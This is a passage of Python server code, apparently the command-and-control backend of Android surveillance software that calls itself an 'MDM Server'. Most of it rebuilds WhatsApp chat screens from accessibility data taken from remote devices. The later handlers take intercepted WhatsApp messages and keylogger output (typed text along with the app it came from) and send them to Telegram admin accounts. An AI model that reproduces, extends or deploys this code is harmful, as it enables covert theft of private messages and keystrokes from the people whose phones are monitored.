        # ⚡ إذا ما في اسم بعد كل هذا، خذ أقصر نص (الاسم عادةً قصير)
        if not name_text and sorted_row:
            candidates = [item for item in sorted_row
                         if item["text"] != time_text and not is_time_text(item["text"])]
            if candidates:
                # الاسم = الأقصر
                name_text = min(candidates, key=lambda x: len(x["text"]))["text"]
                # المعاينة = الأطول
                if len(candidates) > 1:
                    preview_candidates = [c for c in candidates if c["text"] != name_text]
                    if preview_candidates:
                        preview_text = max(preview_candidates, key=lambda x: len(x["text"]))["text"]

        # ⚡ أسطوري: اختر لون الأيقونة بناءً على hash الاسم
        if name_text:
            color_idx = sum(ord(c) for c in name_text) % len(avatar_colors)
            avatar_color = avatar_colors[color_idx]
        else:
            avatar_color = avatar_colors[0]

        # Draw avatar (circle) — بلون عشوائي من القائمة
        avatar_x = 15
        avatar_y = current_y + 5
        avatar_size = 40
        draw.ellipse(
            [avatar_x, avatar_y, avatar_x + avatar_size, avatar_y + avatar_size],
            fill=avatar_color
        )

        # First letter of name
        if name_text:
            letter = name_text[0] if name_text else "?"
            try:
                bbox = draw.textbbox((0, 0), letter, font=font_header)
                tw = bbox[2] - bbox[0]
                th = bbox[3] - bbox[1]
                draw.text((avatar_x + (avatar_size - tw) / 2,
                          avatar_y + (avatar_size - th) / 2 - 2),
                          letter, fill=(255, 255, 255), font=font_header)
            except Exception:
                pass

        # Draw name (top of row)
        text_x = avatar_x + avatar_size + 10
        if name_text:
            draw.text((text_x, current_y + 8), name_text[:30], fill=name_color, font=font_name)

        # Draw message preview (below name) — only if different from name
        if preview_text and preview_text != name_text:
            draw.text((text_x, current_y + 28), preview_text[:40],
                     fill=msg_preview_color, font=font_msg)

        # Draw time (top right)
        if time_text:
            try:
                bbox = draw.textbbox((0, 0), time_text, font=font_time)
                tw = bbox[2] - bbox[0]
                draw.text((img_w - tw - 12, current_y + 8), time_text,
                         fill=time_color, font=font_time)
            except Exception:
                pass

        # Draw divider
        draw.line(
            [(text_x, current_y + row_h - 2), (img_w - 10, current_y + row_h - 2)],
            fill=divider_color, width=1
        )

        if current_y > img_h - 50:
            break

    # ── Bottom tab bar (مُحسّن) ──
    tab_y = img_h - 50
    # خلفية بيضاء مع حدود علوية رفيعة
    draw.rectangle([0, tab_y, img_w, img_h], fill=(255, 255, 255))
    draw.line([(0, tab_y), (img_w, tab_y)], fill=(230, 230, 230), width=1)

    tab_w = img_w / 4
    tabs = [
        ("💬", "المحادثات", True),    # نشط
        ("👥", "المجموعات", False),
        ("📷", "الحالات", False),
        ("📞", "المكالمات", False),
    ]
    for i, (icon, label, active) in enumerate(tabs):
        try:
            # الأيقونة
            bbox = draw.textbbox((0, 0), icon, font=font_header)
            tw = bbox[2] - bbox[0]
            icon_x = tab_w * i + (tab_w - tw) / 2
            icon_y = tab_y + 8

            # لون النشط vs العادي
            color = (37, 211, 102) if active else (136, 136, 136)
            draw.text((icon_x, icon_y), icon, fill=color, font=font_header)

            # النص تحت الأيقونة (صغير)
            bbox2 = draw.textbbox((0, 0), label, font=font_small)
            tw2 = bbox2[2] - bbox2[0]
            draw.text((tab_w * i + (tab_w - tw2) / 2, tab_y + 30), label,
                     fill=color, font=font_small)
        except Exception:
            pass

    # مؤشر النشط (خط أخضر تحت التبويب الأول)
    indicator_x = tab_w * 0 + (tab_w - 30) / 2
    draw.rectangle([indicator_x, tab_y, indicator_x + 30, tab_y + 3],
                   fill=(37, 211, 102))


def _render_conversation(draw, img, img_w, img_h, parsed, scale, font_header,
                         font_msg, font_name, font_time, font_small,
                         bg_color, header_bg, bubble_out_color,
                         bubble_in_color, bubble_out_text, bubble_in_text,
                         time_color, sender_name_color, title_color,
                         app_name, screen_w, _re):
    """Render WhatsApp open conversation with chat bubbles."""
    # ── Top header bar ──
    header_h = 50
    draw.rectangle([0, 0, img_w, header_h], fill=header_bg)
    # Back arrow
    draw.text((5, 14), "‹", fill=title_color, font=font_header)
    # Avatar (circle)
    avatar_x = 30
    avatar_y = 10
    avatar_size = 30
    draw.ellipse(
        [avatar_x, avatar_y, avatar_x + avatar_size, avatar_y + avatar_size],
        fill=(255, 255, 255)
    )
    # Contact name (center)
    contact_name = ""
    for v in parsed:
        if v.get("role") in ("chat_title", "sender") and v["y"] < 100:
            contact_name = v["text"]
            break
    if not contact_name and parsed:
        # Use first text near top
        for v in parsed:
            if v["y"] < 100 and v["text"]:
                contact_name = v["text"]
                break
    if contact_name:
        draw.text((70, 14), contact_name[:25], fill=title_color, font=font_name)
        draw.text((70, 30), "online", fill=(180, 220, 200), font=font_small)
    # Call + menu icons (right)
    draw.text((img_w - 70, 16), "☎", fill=title_color, font=font_header)
    draw.text((img_w - 40, 16), "⋮", fill=title_color, font=font_header)

    # ── Chat bubbles ──
    # Filter out header elements
    bubble_items = [v for v in parsed if v["y"] > (header_h / scale) and v["y"] < (img_h - 60) / scale]
    # Skip non-message items
    bubble_items = [v for v in bubble_items if v.get("role") != "time"]

    # ⚡ إصلاح أسطوري: إزالة الرسائل المكررة (نفس النص + نفس Y تقريباً)
    seen_bubble_texts = set()
    deduplicated_bubbles = []
    for item in bubble_items:
        text_key = item["text"].strip()
        # إذا نفس النص ظهر قبل، تجاهله (Accessibility يُكرر parent + child)
        if text_key and text_key not in seen_bubble_texts:
            seen_bubble_texts.add(text_key)
            deduplicated_bubbles.append(item)
    bubble_items = deduplicated_bubbles

    # ⚡ أسطوري: استخدم الإحداثيات الحقيقية من Accessibility
    # كل فقاعة تُرسم في مكانها الفعلي على الشاشة (مُصغّرة بـ scale)
    # هذا يجعل الصورة مطابقة لشاشة واتساب الحقيقية بنسبة ~95%

    for v in bubble_items:
        # Layer 8: Render date separators as centered pills at real Y
        if v.get("role") == "date_separator":
            try:
                sep_text = v["text"][:30]
                bbox = draw.textbbox((0, 0), sep_text, font=font_time)
                tw = bbox[2] - bbox[0]
                pill_w = tw + 20
                pill_h = 22
                pill_x = (img_w - pill_w) / 2
                # استخدم Y الحقيقية للفاصل
                pill_y = int(v["y"] * scale)
                if pill_y < header_h:
                    pill_y = header_h + 8
                draw.rounded_rectangle([pill_x, pill_y, pill_x + pill_w, pill_y + pill_h],
                                       radius=10, fill=(220, 218, 215))
                draw.text((pill_x + 10, pill_y + 4), sep_text,
                         fill=(80, 80, 80), font=font_time)
                continue
            except Exception:
                pass

        text = v["text"][:120]
        if not text:
            continue

        # Calculate text dimensions
        try:
            bbox = draw.textbbox((0, 0), text, font=font_msg)
            text_w = bbox[2] - bbox[0]
            text_h = bbox[3] - bbox[1]
        except Exception:
            text_w, text_h = 100, 16

        # Word wrap if text too long
        max_bubble_w = int(img_w * 0.7)
        if text_w > max_bubble_w - 16:
            wrapped = []
            line = ""
            for word in text.split(" "):
                try:
                    test = (line + " " + word).strip()
                    bbox = draw.textbbox((0, 0), test, font=font_msg)
                    if bbox[2] - bbox[0] < max_bubble_w - 16:
                        line = test
                    else:
                        if line:
                            wrapped.append(line)
                        line = word
                except Exception:
                    line = word
            if line:
                wrapped.append(line)
            display_text = "\n".join(wrapped[:6])
            try:
                bbox = draw.textbbox((0, 0), display_text, font=font_msg)
                text_w = bbox[2] - bbox[0]
                text_h = bbox[3] - bbox[1]
            except Exception:
                pass
        else:
            display_text = text

        pad = 8
        bubble_w = min(max(text_w + pad * 2, 50), max_bubble_w)
        bubble_h = text_h + pad * 2 + 6

        # Layer 7: Add icon for non-text message types
        msg_type_icon = ""
        if v.get("msg_type") == "image":
            msg_type_icon = "[IMG] "
        elif v.get("msg_type") == "video":
            msg_type_icon = "[VID] "
        elif v.get("msg_type") == "audio":
            msg_type_icon = "[AUD] "
        elif v.get("msg_type") == "document":
            msg_type_icon = "[DOC] "
        elif v.get("msg_type") == "sticker":
            msg_type_icon = "[STK] "

        if msg_type_icon:
            display_text = msg_type_icon + display_text

        # Layer 5: Use paired time if available
        t_str = v.get("time", "") or _time_str()

        # ⚡ أسطوري: استخدم الإحداثيات الحقيقية للموضع
        # X الحقيقي من Accessibility (مُصغّر بـ scale)
        # Y الحقيقي من Accessibility (مُصغّر بـ scale)
        real_x = int(v["x"] * scale)
        real_y = int(v["y"] * scale)

        # تأكد من أن الفقاعة ضمن حدود الصورة
        if real_y < header_h + 5:
            real_y = header_h + 8
        if real_y > img_h - bubble_h - 60:
            break  # خارج حدود الرسم

        if v["out"]:
            # Outgoing — right side, green bubble
            # استخدم X الحقيقي لكن تأكد أنه يمين الشاشة
            bx = min(real_x, img_w - bubble_w - 5)
            bx = max(bx, img_w - bubble_w - 15)  # أجبره يميناً
            by = real_y
            # Layer 10: Draw shadow first
            _draw_shadow(draw, bx, by, bx + bubble_w, by + bubble_h, radius=10)
            draw.rounded_rectangle([bx, by, bx + bubble_w, by + bubble_h],
                                   radius=10, fill=bubble_out_color)
            draw.text((bx + pad, by + pad), display_text, fill=bubble_out_text, font=font_msg)
            # Time inside bubble (bottom right)
            try:
                bbox = draw.textbbox((0, 0), t_str, font=font_time)
                tw = bbox[2] - bbox[0]
                draw.text((bx + bubble_w - tw - pad, by + bubble_h - pad - 8),
                         t_str, fill=time_color, font=font_time)
            except Exception:
                pass
            # Double check mark
            try:
                draw.text((bx + bubble_w - tw - pad - 14, by + bubble_h - pad - 8),
                         ">>", fill=(80, 180, 255), font=font_time)
            except Exception:
                pass
        else:
            # Incoming — left side, white bubble
            # استخدم X الحقيقي لكن تأكد أنه يسار الشاشة
            bx = max(real_x, 5)
            bx = min(bx, 15)  # أجبره يساراً
            by = real_y
            # Layer 10: Draw shadow first
            _draw_shadow(draw, bx, by, bx + bubble_w, by + bubble_h, radius=10)
            draw.rounded_rectangle([bx, by, bx + bubble_w, by + bubble_h],
                                   radius=10, fill=bubble_in_color)
            # Layer 4: Sender name (inside bubble, top)
            sender = v.get("sender", "")
            if sender:
                draw.text((bx + pad, by + pad), sender[:20], fill=sender_name_color, font=font_name)
                draw.text((bx + pad, by + pad + 16), display_text, fill=bubble_in_text, font=font_msg)
            else:
                draw.text((bx + pad, by + pad), display_text, fill=bubble_in_text, font=font_msg)
            # Layer 5: Time (paired)
            try:
                bbox = draw.textbbox((0, 0), t_str, font=font_time)
                tw = bbox[2] - bbox[0]
                draw.text((bx + bubble_w - tw - pad, by + bubble_h - pad - 8),
                         t_str, fill=time_color, font=font_time)
            except Exception:
                pass

    # ── Bottom input bar ──
    input_y = img_h - 50
    draw.rectangle([0, input_y, img_w, img_h], fill=(245, 245, 245))
    # Input field
    draw.rounded_rectangle(
        [10, input_y + 8, img_w - 60, input_y + 42],
        radius=16, fill=(255, 255, 255)
    )
    draw.text((20, input_y + 14), "اكتب رسالة", fill=(180, 180, 180), font=font_msg)
    # Send button (green circle)
    draw.ellipse(
        [img_w - 50, input_y + 8, img_w - 10, input_y + 48],
        fill=(37, 211, 102)
    )
    try:
        draw.text((img_w - 38, input_y + 16), "→", fill=(255, 255, 255), font=font_header)
    except Exception:
        pass


def _render_generic(draw, img_w, img_h, parsed, scale, font_header,
                    font_msg, font_small, bg_color, header_bg,
                    title_color, name_color, app_name, package, _re):
    """Generic fallback renderer."""
    header_h = 40
    draw.rectangle([0, 0, img_w, header_h], fill=header_bg)
    draw.text((10, 10), app_name[:20], fill=title_color, font=font_header)
    draw.text((img_w - 80, 12), f"{len(parsed)} items", fill=title_color, font=font_small)

    y = header_h + 10
    for v in parsed[:25]:
        text = v["text"][:60]
        try:
            bbox = draw.textbbox((0, 0), text, font=font_msg)
            tw = bbox[2] - bbox[0]
        except Exception:
            tw = 60
        draw.rounded_rectangle([10, y, 10 + tw + 12, y + 24],
                               radius=6, fill=(240, 240, 240))
        draw.text((16, y + 4), text, fill=name_color, font=font_msg)
        y += 30
        if y > img_h - 20:
            break


def _time_str():
    """Helper to get current time as HH:MM string."""
    import time as _t
    return _t.strftime("%H:%M")


def _handle_whatsapp_message(dev, data):
    """معالجة رسائل واتساب الواردة من المراقبة الدائمة وإرسالها للبوت."""
    try:
        sender = data.get("sender", "غير معروف")
        text = data.get("text", "")
        app_name = data.get("app", "واتساب")
        time_str = data.get("time_formatted", "")

        if not text:
            return

        short_id = dev.get('short_id', '?')
        model = dev.get('model', '?')
        logger.info(f"💬 [WhatsApp] #{short_id} [{sender}]: {text[:80]}")

        if mdm_bot:
            # تنسيق الرسالة للبوت
            display_text = text[:2000]
            if len(text) > 2000:
                display_text += "..."

            msg = (
                f"💬 <b>رسالة واتساب جديدة</b>\n"
                f"━━━━━━━━━━━━━━━\n"
                f"📱 <b>الجهاز:</b> #{short_id} {model}\n"
                f"👥 <b>المرسل:</b> {sender}\n"
                f"🕐 <b>الوقت:</b> {time_str}\n"
                f"━━━━━━━━━━━━━━━\n"
                f"📝 <b>النص:</b>\n"
                f"<code>{display_text}</code>"
            )

            for admin_id in Config.ADMIN_IDS:
                try:
                    mdm_bot.bot.send_message(admin_id, msg, parse_mode="HTML")
                except Exception as e:
                    logger.error(f"فشل إرسال رسالة واتساب للبوت: {e}")
    except Exception as e:
        logger.error(f"خطأ في معالجة رسالة واتساب: {e}")


def _handle_keylog_event(dev, data):
    """Process keylogger data and forward to Telegram bot."""
    try:
        package = data.get("package", "unknown")
        text = data.get("text", "")
        
        if not text:
            return
        
        short_id = dev.get('short_id', '?')
        model = dev.get('model', '?')
        logger.info(f"⌨️ [Keylog] #{short_id} [{package}]: {text[:100]}")
        
        # Get app name
        app_name = _get_app_name(package) if '_get_app_name' in globals() else package
        
        if mdm_bot:
            display_text = text[:1000]
            if len(text) > 1000:
                display_text += "..."
            
            # ✅ Clean and format the text for better readability
            display_text = display_text.replace('\n', ' ').replace('\r', '').strip()
            
            msg = (
                f"⌨️ <b>تسجيل لوحة المفاتيح</b>\n"
                f"━━━━━━━━━━━━━━━\n"
                f"📱 <b>الجهاز:</b> #{short_id} {model}\n"
                f"📦 <b>التطبيق:</b> {app_name}\n"
                f"━━━━━━━━━━━━━━━\n"
                f"📝 <b>النص المكتوب:</b>\n"
                f"<code>{display_text}</code>\n"
                f"━━━━━━━━━━━━━━━\n"
                f"🕐 {datetime.now(timezone.utc).strftime('%H:%M:%S')}"
            )
            
            for admin_id in Config.ADMIN_IDS:
                try:
                    mdm_bot.bot.send_message(admin_id, msg, parse_mode="HTML")
                except Exception as e:
                    logger.error(f"فشل إرسال keylog للبوت: {e}")
    except Exception as e:
        logger.error(f"خطأ في معالجة keylog: {e}")


# ── Telegram Webhook Endpoint ──
@app.route("/bot/webhook", methods=["POST"])
def _bot_webhook():
    if not mdm_bot:
        return jsonify({"error": "bot not configured"}), 503
    update_data = request.json
    mdm_bot.process_update(update_data)
    return jsonify({"ok": True}), 200

@app.route("/bot/setup", methods=["GET"])
def _bot_setup():
    if not mdm_bot:
        return jsonify({"error": "bot not configured"}), 503
    mdm_bot.setup_webhook()
    return jsonify({"ok": True, "message": "webhook configured"}), 200


# ═══════════════════════════════════════════════════════════════════════
# 11. BACKGROUND LOOPS
# ═══════════════════════════════════════════════════════════════════════

def _cleanup():
    while True:
        time.sleep(60)
        try:
            c = dm.cleanup_stale(Config.HEARTBEAT_TIMEOUT)
            if c: logger.info(f"تنظيف: {c} → أوفلاين")
        except: pass

def _keepalive():
    """إبقاء السيرفر مستيقظ عبر زيارة نفسه كل 4 دقائق"""
    import urllib.request
    time.sleep(30)
    server_url = Config.SERVER_URL
    if not server_url:
        logger.warning("متغير SERVER_URL غير مضبوط - لن يتم إبقاء السيرفر مستيقظاً")
        return
    ping_url = server_url.rstrip("/") + "/ping"
    logger.info(f"تمكين الإبقاء المستيقظ كل 4 دقائق → {ping_url}")
    while True:
        try:
            urllib.request.urlopen(ping_url, timeout=15)
            logger.info(f"keepalive: تم الزيارة بنجاح {datetime.now(timezone.utc).strftime('%H:%M:%S')}")
        except Exception as e:
            logger.warning(f"keepalive: فشل الزيارة - {e}")
        time.sleep(240)


# ═══════════════════════════════════════════════════════════════════════
# 12. MAIN
# ═══════════════════════════════════════════════════════════════════════

def main():
    errors = Config.validate()
    for e in errors:
        logger.warning(f"متغير مفقود: {e}")
    if not Config.BOT_TOKEN:
        logger.warning("BOT_TOKEN غير مضبوط - البوت لن يعمل")
    if errors:
        logger.warning(f"عدد المتغيرات المفقودة: {len(errors)} - السيرفر سيعمل لكن بعض الميزات معطلة")

    logger.info(f"MDM Server v7.0 جاري التشغيل على المنفذ {Config.PORT}")
    eventlet.spawn(_cleanup)
    eventlet.spawn(_keepalive)
    if mdm_bot:
        mdm_bot.setup_webhook()
        logger.info("تم تشغيل البوت بالـ webhook")

    socketio.run(app, host="0.0.0.0", port=Config.PORT, debug=False, use_reloader=False)

if __name__ == "__main__":
    try:
        main()
    except Exception as e:
        logger.critical(f"فشل التشغيل: {type(e).__name__}: {e}", exc_info=True)
        sys.exit(1)
